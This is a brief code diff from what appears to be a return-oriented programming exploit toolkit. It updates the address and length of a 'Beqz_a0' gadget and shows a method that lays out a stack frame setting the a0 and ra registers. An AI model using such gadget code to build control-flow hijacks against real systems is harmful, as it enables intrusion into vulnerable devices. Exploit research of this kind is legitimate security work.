@@ -15,7 +15,7 @@ class Beqz_a0(ROP_Gadget):
     '''
 
     def __init__(self):
-        super().__init__(0x4bd94, 1264)
+        super().__init__(0x4bede, 0x30)
 
     def construct_frame(self, a0, ra):
         data = [0, 0, 0, a0, 0, ra]
